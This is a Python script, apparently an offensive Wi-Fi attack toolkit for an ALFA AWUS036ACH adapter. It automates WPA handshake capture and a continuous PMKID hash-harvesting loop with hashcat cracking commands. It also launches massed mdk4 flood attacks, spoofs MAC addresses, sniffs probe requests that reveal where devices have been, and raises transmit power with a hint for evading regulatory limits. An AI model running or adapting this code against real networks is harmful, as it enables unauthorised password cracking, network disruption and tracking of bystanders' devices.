#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  ALFA MANGER v2 — AWUS036ACH Full Attack Toolkit           ║
║  Version corrigee : parsing canal fiable, affichage propre ║
║  RTL8812AU • Dual-Band 2.4/5GHz                           ║
╚══════════════════════════════════════════════════════════════╝

Interactive:  sudo python3 alfa_mangler.py
CLI:          sudo python3 alfa_mangler.py --apocalypse
              sudo python3 alfa_mangler.py --pmkid-loop
              sudo python3 alfa_mangler.py --crash auto -t ultimate
"""

import subprocess, sys, os, time, signal, argparse, shutil, re, textwrap
from pathlib import Path
from datetime import datetime
from collections import OrderedDict

try:
    import alfa_brain as brain
except Exception:
    brain = None

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════

IFACE = "wlan1"
MON_IFACE = "wlan1mon"
OUT_DIR = Path.home() / ".cache" / "nyvyrx_ss_lsof" / "captures"
_INJECTION_RATE = None
WORDLIST_DIR = Path("/usr/share/wordlists")
ROCKYOU = WORDLIST_DIR / "rockyou.txt"
HOSTAPD_CONF = "/tmp/alfa_hostapd.conf"
DNSMASQ_CONF = "/tmp/alfa_dnsmasq.conf"

_AIRSNITCH_PATH = None

C = {
    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "B": "\033[94m",
    "M": "\033[95m", "C": "\033[96m", "W": "\033[97m", "N": "\033[0m",
    "BOLD": "\033[1m", "DIM": "\033[2m",
}

BANNER = f"""
{C['C']}   ╔══════════════════════════════════════════════════╗
   ║   {C['M']}▲ {C['W']}ALFA MANGER v2 {C['DIM']}— AWUS036ACH Full Toolkit{C['C']}    ║
   ║   {C['DIM']}Auto RF-kill • PMKID Loop • Apocalypse Engine{C['C']}   ║
   ╚══════════════════════════════════════════════════╝{C['N']}
"""

# ═══════════════════════════════════════════════════════════════
# KILLER – nettoie tout à la sortie
# ═══════════════════════════════════════════════════════════════

_KILLER_PIDS = set()
_KILLER_PGIDS = set()
_KILLER_ARMED = False
_KILLER_TRIGGERED = False

def _killer_handler(signum, frame):
    global _KILLER_TRIGGERED
    if _KILLER_TRIGGERED:
        print(f"\n  {C['R']}[!!] FORCE EXIT{C['N']}")
        os._exit(1)
    _KILLER_TRIGGERED = True
    print(f"\n\n{C['R']}{'='*60}{C['N']}")
    print(f"{C['R']}{C['BOLD']}  KILLER STATE — Ctrl+C received{C['N']}")
    print(f"{C['R']}{'='*60}{C['N']}")

    for pid in list(_KILLER_PIDS):
        try:
            os.kill(pid, signal.SIGKILL)
        except (OSError, ProcessLookupError):
            pass
    for pgid in list(_KILLER_PGIDS):
        try:
            os.killpg(pgid, signal.SIGKILL)
        except (OSError, ProcessLookupError):
            pass

    for tool in ["mdk4", "airbase-ng", "airodump-ng", "aireplay-ng", "hostapd", "dnsmasq", "hcxdumptool", "reaver", "bully"]:
        os.system(f"pkill -9 -f '{tool}' 2>/dev/null")

    os.system(f"ip link set {IFACE} down 2>/dev/null")
    os.system(f"iw dev {IFACE} set type managed 2>/dev/null")
    os.system(f"ip link set {IFACE} up 2>/dev/null")
    if shutil.which("systemctl"):
        try:
            out = subprocess.run(
                ["systemctl", "is-active", "NetworkManager"],
                capture_output=True, text=True
            ).stdout.lower().strip()
            if out == "running":
                os.system("systemctl restart NetworkManager 2>/dev/null &")
        except Exception:
            pass
    print(f"{C['G']}  System restored safely.{C['N']}")
    sys.stdout.flush()
    os._exit(0)

def _arm_killer():
    global _KILLER_ARMED
    if not _KILLER_ARMED:
        signal.signal(signal.SIGINT, _killer_handler)
        signal.signal(signal.SIGTERM, _killer_handler)
        _KILLER_ARMED = True

def _track(pid, pgid=None):
    _KILLER_PIDS.add(pid)
    if pgid:
        _KILLER_PGIDS.add(pgid)

def _untrack(pid):
    _KILLER_PIDS.discard(pid)

# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════

def run(cmd, sudo=True, live=False, check=False, timeout=None, **kw):
    if sudo and os.geteuid() != 0:
        cmd = f"sudo {cmd}"
    print(f"\n  {C['DIM']}-> {cmd}{C['N']}")

    if live:
        p = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid, **kw)
        pgid = os.getpgid(p.pid)
        _track(p.pid, pgid)
        try:
            p.wait()
            _untrack(p.pid)
        except KeyboardInterrupt:
            pass
        return p.returncode
    else:
        try:
            r = subprocess.run(cmd, shell=True, check=check, timeout=timeout,
                               capture_output=True, text=True, **kw)
            return r
        except subprocess.TimeoutExpired:
            return None
        except KeyboardInterrupt:
            return None

def check_root():
    if os.geteuid() != 0:
        print(f"{C['Y']}[!] Need root. Re-launching with sudo...{C['N']}")
        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)

def require(*tools):
    missing = [t for t in tools if not shutil.which(t)]
    if missing:
        print(f"{C['R']}[!] Missing: {', '.join(missing)}{C['N']}")
        pm = detect_package_manager()
        pkgs = " ".join([str(v) for v in {_TOOL_PKG_MAP.get(t, t) for t in missing}])
        if pm and pm in _PKG_INSTALL_HINTS:
            print(f"    Install: {_PKG_INSTALL_HINTS[pm].format(pkgs=pkgs)}")
        else:
            print(f"    Install with your package manager: {pkgs}")
        return False
    return True

def ok(msg):
    print(f"  {C['G']}[+] {msg}{C['N']}")

def warn(msg):
    print(f"  {C['Y']}[!] {msg}{C['N']}")

def err(msg):
    print(f"  {C['R']}[-] {msg}{C['N']}")

def header(title):
    print(f"\n{C['BOLD']}{C['C']}{'='*60}{C['N']}")
    print(f"{C['BOLD']}{C['W']}  {title}{C['N']}")
    print(f"{C['BOLD']}{C['C']}{'='*60}{C['N']}")

def ask(prompt, default=None):
    d = f" [{default}]" if default else ""
    return input(f"  {C['W']}{prompt}{d}: {C['N']}") or default

def ensure_dir():
    OUT_DIR.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════════
# INTELLIGENT INTERFACE MANAGER – débloque RF-kill automatiquement
# ═══════════════════════════════════════════════════════════════

def ensure_interface_ready():
    ok("Preparation de l'interface...")
    os.system("sudo rfkill unblock wifi 2>/dev/null")
    time.sleep(0.5)
    r = subprocess.run(["rfkill", "list"], capture_output=True, text=True)
    if "Soft blocked: yes" in r.stdout or "Hard blocked: yes" in r.stdout:
        warn("RF-kill detecte. Tentative de deblocage force...")
        os.system("sudo rfkill unblock all 2>/dev/null")
        time.sleep(1)
        r2 = subprocess.run(["rfkill", "list"], capture_output=True, text=True)
        if "Soft blocked: yes" in r2.stdout or "Hard blocked: yes" in r2.stdout:
            err("Impossible de debloquer RF-kill. Verifiez le commutateur materiel.")
            return False
    ok("RF-kill debloque")

    for tool in ["wpa_supplicant", "dhcpcd", "dhclient", "NetworkManager"]:
        os.system(f"sudo pkill -9 -f '{tool}' 2>/dev/null")
    time.sleep(0.5)
    ok("Processus conflictuels nettoyes")

    os.system(f"sudo ip link set {IFACE} down 2>/dev/null")
    os.system(f"sudo iw dev {IFACE} set type managed 2>/dev/null")
    os.system(f"sudo ip link set {IFACE} up 2>/dev/null")
    time.sleep(1)

    r = subprocess.run(["ip", "link", "show", IFACE], capture_output=True, text=True)
    if IFACE not in r.stdout:
        err(f"Interface {IFACE} introuvable. Verifiez le cable USB.")
        return False
    ok(f"Interface {IFACE} presente")

    if shutil.which("nmcli"):
        try:
            if "running" in subprocess.run(
                ["systemctl", "is-active", "NetworkManager"],
                capture_output=True, text=True
            ).stdout.lower().strip():
                subprocess.run(
                    f"sudo nmcli device set {IFACE} managed off 2>/dev/null",
                    shell=True, capture_output=True, text=True
                )
                ok(f"NetworkManager disabled on {IFACE}")
            else:
                warn("NetworkManager not running; skipping nmcli managed toggle")
        except Exception:
            pass

    os.system(f"sudo ip link set {IFACE} down 2>/dev/null")
    os.system(f"sudo iw dev {IFACE} set type monitor 2>/dev/null")
    os.system(f"sudo ip link set {IFACE} up 2>/dev/null")
    time.sleep(0.5)

    r = subprocess.run(["iw", "dev", IFACE, "info"], capture_output=True, text=True)
    if "type monitor" not in r.stdout:
        warn("Le passage en mode monitor a echoue. Tentative avec airmon-ng...")
        os.system(f"sudo airmon-ng start {IFACE} 2>/dev/null")
        time.sleep(1)
    ok(f"{IFACE} en mode monitor")
    return True

def choose_iface():
    return IFACE

def set_monitor():
    ensure_interface_ready()

def set_managed():
    header("SWITCHING TO MANAGED MODE")
    os.system(f"sudo ip link set {IFACE} down")
    os.system(f"sudo iw dev {IFACE} set type managed")
    os.system(f"sudo ip link set {IFACE} up")
    if shutil.which("systemctl"):
        try:
            out = subprocess.run(
                ["systemctl", "is-active", "NetworkManager"],
                capture_output=True, text=True
            ).stdout.lower().strip()
            if out == "running":
                os.system("sudo systemctl restart NetworkManager 2>/dev/null &")
                ok(f"{IFACE} en mode managed + NetworkManager relance")
            else:
                warn("NetworkManager not running; adapter left in managed mode")
        except Exception:
            warn("Could not query NetworkManager state")
    else:
        warn("systemctl not found; adapter left in managed mode")

def set_channel(ch, iface=None, width=None):
    if ch < 1 or ch > 165:
        warn(f"Canal invalide : {ch}. Utilisation du canal 6.")
        ch = 6
    iface = iface or choose_iface()
    cmd = f"iw dev {iface} set channel {ch}"
    if width:
        cmd += f" {width}"
    run(cmd)

def set_mcs_rate(iface=None, preset="5g-max"):
    iface = iface or choose_iface()
    presets = {
        "5g-max": "legacy-5 300 vht-mcs-5 9 he-mcs-5 11",
        "2g-max": "legacy-2.4 54 ht-mcs-2 7",
        "auto": "auto",
    }
    rates = presets.get(preset, "auto")
    if preset == "auto":
        # Allow kernel rate control to pick best rate
        run(f"iw dev {iface} set bitrates auto")
        ok("Bitrate control: auto adaptive (minstrel_ht)")
        return
    run(f"iw dev {iface} set bitrates {rates}")
    ok(f"Bitrate preset '{preset}' set -> {rates}")

def spoof_mac(iface=None):
    iface = iface or IFACE
    require("macchanger")
    run(f"ip link set {iface} down")
    run(f"macchanger -r {iface}")
    run(f"ip link set {iface} up")
    r = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
    ok(f"New MAC: {r.stdout}")

def cleanup():
    header("CLEANUP")
    os.system(f"pkill -9 mdk4 2>/dev/null")
    os.system(f"pkill -9 airbase-ng 2>/dev/null")
    os.system(f"pkill -9 airodump-ng 2>/dev/null")
    os.system(f"pkill -9 aireplay-ng 2>/dev/null")
    os.system(f"pkill -9 hostapd 2>/dev/null")
    os.system(f"pkill -9 dnsmasq 2>/dev/null")
    os.system(f"pkill -9 hcxdumptool 2>/dev/null")
    os.system(f"pkill -9 reaver 2>/dev/null")
    os.system(f"pkill -9 bully 2>/dev/null")
    os.system(f"ip link set {IFACE} down")
    os.system(f"iw dev {IFACE} set type managed")
    os.system(f"ip link set {IFACE} up")
    if shutil.which("systemctl"):
        try:
            out = subprocess.run(
                ["systemctl", "is-active", "NetworkManager"],
                capture_output=True, text=True
            ).stdout.lower().strip()
            if out == "running":
                os.system("systemctl restart NetworkManager 2>/dev/null &")
        except Exception:
            pass
    ok("All interfaces restored to managed mode")

# ═══════════════════════════════════════════════════════════════
# PERFORMANCE TUNING — AWUS036ACH MAX PERF
# ═══════════════════════════════════════════════════════════════

def tune_adapter():
    header("ADAPTER PERFORMANCE TUNING")
    changes = []

    # USB autosuspend — must be -1 for zero-latency injection
    autosuspend = "/sys/module/usbcore/parameters/autosuspend"
    if os.path.exists(autosuspend):
        try:
            with open(autosuspend, "w") as f:
                f.write("-1\n")
            changes.append("USB autosuspend DISABLED (-1)")
        except Exception as e:
            warn(f"Cannot change usbcore autosuspend: {e}")

    # rtw88 deep sleep — disable for fastest wake-up on injection
    deep_sleep = "/sys/module/rtw88_core/parameters/disable_lps_deep"
    if os.path.exists(deep_sleep):
        try:
            with open(deep_sleep, "w") as f:
                f.write("Y\n")
            changes.append("rtw88 deep sleep DISABLED")
        except Exception as e:
            warn(f"Cannot disable deep sleep: {e}")

    # Beamformee (2x2 MIMO) — keep enabled for higher rates
    bfp = "/sys/module/rtw88_core/parameters/support_bf"
    if os.path.exists(bfp):
        try:
            with open(bfp, "w") as f:
                f.write("Y\n")
            changes.append("Beamformee VHT/HE ENABLED (2x2 MIMO)")
        except Exception as e:
            warn(f"Cannot enable beamform: {e}")

    # USB mode switching — lock to USB 3.0 high-speed
    usb_mode = "/sys/module/rtw88_usb/parameters/switch_usb_mode"
    if os.path.exists(usb_mode):
        try:
            with open(usb_mode, "w") as f:
                f.write("N\n")
            changes.append("USB mode switch locked (forces 3.0 highspeed)")
        except Exception as e:
            warn(f"Cannot lock USB mode: {e}")

    # Interface txqueuelen — larger ring buffer under burst injection
    try:
        subprocess.run(["ip", "link", "set", IFACE, "txqueuelen", "2000"],
                       capture_output=True, text=True)
        changes.append(f"{IFACE} txqueuelen 2000")
    except Exception:
        pass

    # Power save off on the managed interface if it exists
    try:
        r = subprocess.run(["iw", "dev", IFACE, "set", "power_save", "off"],
                           capture_output=True, text=True)
        if r.returncode == 0:
            changes.append(f"{IFACE} power_save OFF")
    except Exception:
        pass

    # Socket / network buffers
    try:
        for p in ["/proc/sys/net/core/rmem_default", "/proc/sys/net/core/rmem_max",
                  "/proc/sys/net/core/wmem_default", "/proc/sys/net/core/wmem_max"]:
            with open(p, "w") as fh:
                fh.write("12582912\n")
        changes.append("Socket buffers 12MB (rx/tx)")
    except Exception as e:
        warn(f"Socket buffer tuning failed: {e}")

    if changes:
        for c in changes:
            ok(c)
        ok("Adapter tuned for MAX injection / throughput performance")
    else:
        warn("No tunable params found — driver may be read-only hardened")
    return changes

def boost_txpower(dbm=None):
    header("TX POWER BOOST")
    if dbm is None:
        dbm = ask("Target dBm (0-30, legal limit varies by country)", "30")
        try:
            dbm = int(dbm)
        except ValueError:
            err("Invalid dBm")
            return

    if not 0 <= dbm <= 30:
        err("dBm out of safe range")
        return

    # Try nl80211 first (newer kernels)
    r = subprocess.run(["iw", "dev", IFACE, "set", "txpower", "fixed", str(dbm)],
                       capture_output=True, text=True)
    if r.returncode == 0:
        ok(f"{IFACE} txpower set to {dbm} dBm")
        return

    # Fallback: iwconfig
    r2 = subprocess.run(["iwconfig", IFACE, "txpower", str(dbm)],
                        capture_output=True, text=True)
    if r2.returncode == 0:
        ok(f"{IFACE} txpower set to {dbm} dBm via iwconfig")
    else:
        err(f"Failed to set txpower to {dbm} dBm: {r2.stderr.strip()} or {r.stderr.strip()}")
        warn("Try changing regulatory domain: sudo iw reg set BO/00")

def show_perf():
    header("PERFORMANCE STATUS")
    print(f"  Interface: {IFACE}")
    print(f"  Mode: {run('iw dev ' + IFACE + ' info').stdout}")

    # Current tx power
    try:
        r = subprocess.run(["iw", "dev", IFACE, "link"], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if "signal" in line.lower() or "tx bitrate" in line.lower():
                print(f"  {line.strip()}")
    except Exception:
        pass

    # Driver parameters
    print(f"\n  {C['BOLD']}DRIVER PARAMS{C['N']}")
    for path in [
        "/sys/module/rtw88_core/parameters/debug_mask",
        "/sys/module/rtw88_core/parameters/disable_lps_deep",
        "/sys/module/rtw88_core/parameters/support_bf",
        "/sys/module/rtw88_usb/parameters/switch_usb_mode",
        "/sys/module/usbcore/parameters/autosuspend"
    ]:
        name = path.split("/")[-1]
        try:
            with open(path) as f:
                val = f.read().strip()
            print(f"    {name}: {C['G']}{val}{C['N']}")
        except Exception:
            print(f"    {name}: {C['R']}unreadable{C['N']}")

    # Interface stats
    print(f"\n  {C['BOLD']}TRAFFIC / RX-TX{C['N']}")
    try:
        r = subprocess.run(["ethtool", "-S", IFACE], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if any(k in line for k in ["rx_packets", "tx_packets", "rx_bytes", "tx_bytes", "tx_retries", "rx_dropped", "tx_dropped"]):
                print(f"    {line.strip()}")
    except Exception:
        pass

def set_injection_rate(pps=None):
    global _INJECTION_RATE
    header("INJECTION RATE CONTROL")
    if pps is None:
        pps = ask("Packets per second (e.g. 200, 500, 1000)", "500")
        try:
            pps = int(pps)
        except ValueError:
            err("Invalid number")
            return
    if not 1 <= pps <= 2000:
        warn("Very high PPS may freeze the interface")
    _INJECTION_RATE = pps
    ok(f"Aireplay injection rate -> {pps} pps")
    return pps

def tune_mdk4_speed(channel=None, procs=None):
    header("MDK4 PERFORMANCE FLAGS")
    if procs is None:
        raw = ask("Number of parallel mdk4 processes (1-100)", "10")
        try:
            procs = int(raw)
        except ValueError:
            err("Invalid number")
            return
    if procs < 1: procs = 1
    if procs > 100: procs = 100
    ch = channel or ask("Channel to fix (Enter to skip)", "")
    flags = ask("Extra mdk4 flags (e.g. -m -s 999)", "-m -s 999")
    cmd_base = f"sudo mdk4 {IFACE}"
    c = f"-c {ch} " if ch else ""
    cmd = f"{cmd_base} {c}{flags}"
    print(f"  Launching {procs} instances of: {cmd}")
    import threading
    def run_one():
        subprocess.run(cmd, shell=True, preexec_fn=os.setsid)
    threads = []
    for i in range(procs):
        t = threading.Thread(target=run_one, daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.05)
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n  {C['Y']}[!] Stopping...{C['N']}")
    finally:
        os.system("pkill -9 -f 'mdk4' 2>/dev/null")

# ═══════════════════════════════════════════════════════════════
# TOOLS AUDIT (raccourci)
# ═══════════════════════════════════════════════════════════════

TOOLS_MAP = OrderedDict([
    ("aircrack-ng",     ["aircrack-ng",     "WPA Cracking"]),
    ("airodump-ng",     ["airodump-ng",     "Recon"]),
    ("aireplay-ng",     ["aireplay-ng",     "Deauth/Injection"]),
    ("airbase-ng",      ["airbase-ng",      "Evil Twin"]),
    ("hcxdumptool",     ["hcxdumptool",     "PMKID Capture"]),
    ("hcxpcapngtool",   ["hcxpcapngtool",   "PMKID Conversion"]),
    ("mdk4",            ["mdk4",            "DoS/Flood"]),
    ("hashcat",         ["hashcat",         "GPU Cracking"]),
    ("john",            ["john",            "CPU Cracking"]),
    ("reaver",          ["reaver",          "WPS Attack"]),
    ("bully",           ["bully",           "WPS Attack (fast)"]),
    ("pixiewps",        ["pixiewps",        "WPS Pixie Dust"]),
    ("wifite",          ["wifite",          "Auto-Pwn"]),
    ("cowpatty",        ["genpmk",          "PMK Rainbow Tables"]),
    ("hostapd",         ["hostapd",         "Evil Twin AP"]),
    ("dnsmasq",         ["dnsmasq",         "DHCP/DNS for AP"]),
    ("bettercap",       ["bettercap",       "MITM"]),
    ("kismet",          ["kismet",          "Wardriving"]),
    ("macchanger",      ["macchanger",      "MAC Spoof"]),
    ("wireshark",       ["wireshark",       "Packet Analysis"]),
    ("tshark",          ["tshark",          "CLI Packet Analysis"]),
    ("airgeddon",       ["airgeddon",       "Auto-Framework"]),
])

def audit_tools():
    header("TOOL AUDIT")
    cats = {}
    for name, (bin_name, cat) in TOOLS_MAP.items():
        cats.setdefault(cat, []).append((name, shutil.which(bin_name) is not None))
    for cat, tools in cats.items():
        total = len(tools)
        have = sum(1 for _, ok in tools if ok)
        color = C['G'] if have == total else C['Y'] if have > 0 else C['R']
        print(f"\n  {C['BOLD']}{cat}{C['N']} {color}({have}/{total}){C['N']}")
        for name, ok in tools:
            icon = f"{C['G']}✓{C['N']}" if ok else f"{C['R']}✗{C['N']}"
            print(f"    {icon} {name}")

def detect_package_manager():
    for pm in ["apt", "apt-get", "dnf", "yum", "pacman", "zypper", "apk", "nix-env"]:
        if shutil.which(pm):
            return pm
    return None

_PKG_INSTALL_HINTS = {
    "apt":       "sudo apt update && sudo apt install -y {pkgs}",
    "apt-get":   "sudo apt-get update && sudo apt-get install -y {pkgs}",
    "dnf":       "sudo dnf install -y {pkgs}",
    "yum":       "sudo yum install -y {pkgs}",
    "pacman":    "sudo pacman -S --noconfirm {pkgs}",
    "zypper":    "sudo zypper install -y {pkgs}",
    "apk":       "sudo apk add {pkgs}",
    "nix-env":   "nix-env -iA nixos.{pkgs}",
}

_TOOL_PKG_MAP = {
    "aircrack-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "airbase-ng": "aircrack-ng",
    "hcxdumptool": "hcxdumptool",
    "hcxpcapngtool": "hcxtools",
    "mdk4": "mdk4",
    "hashcat": "hashcat",
    "john": "john",
    "reaver": "reaver",
    "bully": "bully",
    "pixiewps": "pixiewps",
    "wifite": "wifite",
    "cowpatty": "cowpatty",
    "hostapd": "hostapd",
    "dnsmasq": "dnsmasq",
    "bettercap": "bettercap",
    "kismet": "kismet",
    "macchanger": "macchanger",
    "tcpdump": "tcpdump",
    "nmcli": "network-manager",
    "wpa_supplicant": "wpa_supplicant",
    "dhclient": "dhclient",
    "dhcpcd": "dhcpcd",
}

def install_missing():
    missing = [name for name, (bin_name, _) in TOOLS_MAP.items() if not shutil.which(bin_name)]
    if not missing:
        ok("All tools installed!")
        return
    pkgs = sorted({_TOOL_PKG_MAP.get(t, t) for t in missing})
    pkg_list = " ".join(pkgs)
    print(f"\n  Missing: {', '.join(missing)}")
    print(f"  Packages: {pkg_list}")
    pm = detect_package_manager()
    if pm and pm in _PKG_INSTALL_HINTS:
        print(f"  Detected package manager: {pm}")
        print(f"  Run: {_PKG_INSTALL_HINTS[pm].format(pkgs=pkg_list)}")
    else:
        print("  Install the packages above with your distro's package manager.")

# ═══════════════════════════════════════════════════════════════
# NOUVELLE FONCTION : Afficher les réseaux avec nmcli
# ═══════════════════════════════════════════════════════════════

def show_wifi_nmcli():
    header("WIFI NETWORKS (nmcli)")
    print("  (Assurez-vous que l'interface est en mode managed pour voir les reseaux)\n")
    os.system("nmcli -f IN-USE,BSSID,SSID,MODE,CHAN,RATE,SIGNAL,BARS,SECURITY dev wifi list 2>/dev/null || echo 'Erreur: nmcli non installe ou interface indisponible'")
    input("\n  [Enter] pour continuer")

# ═══════════════════════════════════════════════════════════════
# RECON
# ═══════════════════════════════════════════════════════════════

def scan_aps(band="abg", timeout=10, save=True):
    require("airodump-ng")
    ensure_dir()
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header(f"SCANNING — {iface} — {band} band — {timeout}s")
    prefix = f"{OUT_DIR}/scan_{datetime.now().strftime('%H%M%S')}"
    run(f"airodump-ng --band {band} -w {prefix} --output-format csv {iface}", live=True,
        env={**os.environ, "TERM": "dumb"})
    csv_file = f"{prefix}-01.csv"
    if os.path.exists(csv_file):
        ok(f"Scan saved: {csv_file}")
    return csv_file

def scan_5ghz(timeout=10):
    return scan_aps(band="a", timeout=timeout)

def hidden_ssid_discover(channel=None, timeout=30):
    require("airodump-ng")
    ensure_dir()
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header("HIDDEN SSID DISCOVERY")
    prefix = f"{OUT_DIR}/hidden_{datetime.now().strftime('%H%M%S')}"
    cmd = f"airodump-ng --band abg -w {prefix} --output-format csv {iface}"
    if channel:
        set_channel(channel, iface)
    print(f"  Watch for 'Probes' column — these are networks clients are asking for")
    print(f"  Often reveals hidden SSIDs. (Ctrl+C to stop)")
    run(cmd, live=True, env={**os.environ, "TERM": "dumb"})

def probe_sniff(timeout=30):
    require("airodump-ng")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header("PROBE REQUEST SNIFFER")
    prefix = f"{OUT_DIR}/probes_{datetime.now().strftime('%H%M%S')}"
    cmd = f"airodump-ng --band abg -w {prefix} --output-format csv {iface}"
    print(f"  {C['Y']}Probes reveal where devices have connected before (hotels, home, work...){C['N']}")
    print(f"  Look for the 'Probes' column in the lower section.")
    run(cmd, live=True, env={**os.environ, "TERM": "dumb"})

def injection_test(target_bssid=None, channel=None):
    require("aireplay-ng")
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    header("INJECTION TEST")
    cmd = f"aireplay-ng -9 {iface}"
    if target_bssid:
        cmd += f" -a {target_bssid}"
    if channel:
        set_channel(channel, iface)
    run(cmd, live=True)

# ═══════════════════════════════════════════════════════════════
# WPA ATTACKS
# ═══════════════════════════════════════════════════════════════

def capture_handshake(bssid, channel, output_name=None, client=None):
    require("airodump-ng")
    ensure_dir()
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    set_channel(channel, iface)
    prefix = output_name or f"cap_{bssid.replace(':', '')}"
    outpath = f"{OUT_DIR}/{prefix}"
    header(f"HANDSHAKE CAPTURE — {bssid} ch{channel}")
    print(f"  Output: {outpath}-01.cap")
    print(f"  {C['Y']}Wait for 'WPA handshake: {bssid}' in top-right corner{C['N']}")
    print(f"  Tip: in another terminal run: sudo python3 {sys.argv[0]} deauth {bssid}")
    run(f"airodump-ng -c {channel} --bssid {bssid} -w {outpath} {iface}", live=True,
        env={**os.environ, "TERM": "dumb"})
    if os.path.exists(f"{outpath}-01.cap"):
        ok(f"Capture saved — crack it: python3 {sys.argv[0]} crack {outpath}-01.cap")
    return f"{outpath}-01.cap"

def pmkid_capture(channel, timeout=None, output_name=None):
    require("hcxdumptool", "hcxpcapngtool")
    ensure_dir()
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    set_channel(channel, iface)
    ts = int(time.time())
    prefix = output_name or f"pmkid_{ts}"
    outfile = f"{OUT_DIR}/{prefix}.pcapng"
    hashfile = f"{OUT_DIR}/{prefix}.hc22000"
    header(f"PMKID CAPTURE — {iface} ch{channel}")
    print(f"  {C['Y']}No clients or deauth needed — grabs PMKID from RSN IE{C['N']}")
    print(f"  Output: {outfile}")
    run(f"hcxdumptool -i {iface} -c {channel} -O {outfile} --enable_status=1", live=True)
    if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
        print()
        ok("Converting to hashcat format...")
        r = run(f"hcxpcapngtool -o {hashfile} -E {OUT_DIR}/essidlist_{ts} {outfile}")
        if r and r.returncode == 0:
            ok(f"PMKID hashes: {hashfile}")
            print(f"  Crack: hashcat -m 22000 {hashfile} /path/to/wordlist.txt")
        else:
            warn("No PMKIDs captured — AP may not support PMKID or no APs on that channel")
    return hashfile

def pmkid_capture_loop(channel=None, output_name=None):
    require("hcxdumptool", "hcxpcapngtool")
    ensure_dir()
    if not ensure_interface_ready():
        return
    iface = choose_iface()
    
    if not output_name:
        output_name = f"pmkid_loop_{datetime.now().strftime('%H%M%S')}"
    
    master_hashfile = f"{OUT_DIR}/{output_name}.hc22000"
    header(f"PMKID LOOP — {iface} — {'Canal ' + str(channel) if channel else 'Auto'}")
    print(f"  {C['Y']}Capture continue jusqu'a Ctrl+C")
    print(f"  {C['Y']}Fichier final : {master_hashfile}")
    print(f"  {C['DIM']}(Les hashs s'accumulent a chaque cycle){C['N']}")
    
    if not os.path.exists(master_hashfile):
        Path(master_hashfile).touch()
    
    total_hashes = 0
    
    try:
        while True:
            current_channel = channel
            if not current_channel:
                current_channel = 6
                try:
                    tmp_file = "/tmp/pmkid_scan"
                    proc = subprocess.Popen(
                        f"timeout 3 airodump-ng --band abg -w {tmp_file} --output-format csv {iface}",
                        shell=True, preexec_fn=os.setsid,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    time.sleep(4)
                    os.killpg(os.getpgid(proc.pid), signal.SIGINT)
                    time.sleep(1)
                    channels = {}
                    with open(f"{tmp_file}-01.csv", "r") as f:
                        for line in f:
                            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line):
                                parts = line.split(',')
                                if len(parts) >= 5:
                                    ch = parts[4].strip()
                                    if ch.isdigit():
                                        ch_int = int(ch)
                                        if 1 <= ch_int <= 165:
                                            channels[ch] = channels.get(ch, 0) + 1
                    os.system(f"rm -f {tmp_file}-* 2>/dev/null")
                    if channels:
                        current_channel = int(max(channels, key=channels.get))
                        print(f"  {C['DIM']}Canal selectionne : {current_channel} ({channels[str(current_channel)]} APs){C['N']}")
                    else:
                        current_channel = 6
                except Exception as e:
                    warn(f"Erreur de scan : {e}")
                    current_channel = 6
            
            set_channel(current_channel, iface)
            cycle_pcap = f"/tmp/pmkid_cycle_{int(time.time())}.pcapng"
            
            print(f"\n  {C['B']} Cycle sur le canal {current_channel}...{C['N']}")
            cycle_cmd = f"hcxdumptool -i {iface} -c {current_channel} -O {cycle_pcap} --enable_status=1"
            
            p = subprocess.Popen(
                cycle_cmd, shell=True, preexec_fn=os.setsid,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            _track(p.pid, os.getpgid(p.pid))
            
            try:
                time.sleep(10)
                os.killpg(os.getpgid(p.pid), signal.SIGINT)
                time.sleep(1)
            except (OSError, ProcessLookupError):
                pass
            _untrack(p.pid)
            
            if os.path.exists(cycle_pcap) and os.path.getsize(cycle_pcap) > 0:
                cycle_hash = f"/tmp/cycle_hash_{int(time.time())}.hc22000"
                r = subprocess.run(
                    f"hcxpcapngtool -o {cycle_hash} {cycle_pcap}",
                    shell=True, capture_output=True, text=True
                )
                if r.returncode == 0 and os.path.exists(cycle_hash):
                    new_hashes = 0
                    try:
                        with open(cycle_hash, "r") as hf:
                            lines = hf.readlines()
                            new_hashes = len(lines)
                        if new_hashes > 0:
                            os.system(f"cat {cycle_hash} >> {master_hashfile}")
                            total_hashes += new_hashes
                            print(f"  {C['G']}  {new_hashes} nouveaux hashs (total: {total_hashes}){C['N']}")
                        else:
                            print(f"  {C['DIM']}Aucun hash sur ce canal.{C['N']}")
                    except Exception as e:
                        warn(f"Erreur de parsing: {e}")
                    os.system(f"rm -f {cycle_hash} 2>/dev/null")
                os.system(f"rm -f {cycle_pcap} 2>/dev/null")
            else:
                print(f"  {C['DIM']}Aucune capture sur ce canal.{C['N']}")
            
            if channel:
                time.sleep(2)
            else:
                print(f"  {C['DIM']}Scan du prochain canal...{C['N']}")
                time.sleep(2)
    
    except KeyboardInterrupt:
        print(f"\n  {C['Y']}[!] Arret demande...{C['N']}")
    
    os.system("rm -f /tmp/pmkid_*.pcapng 2>/dev/null")
    ok(f"Capture terminee. {total_hashes} hashs accumules dans {master_hashfile}")
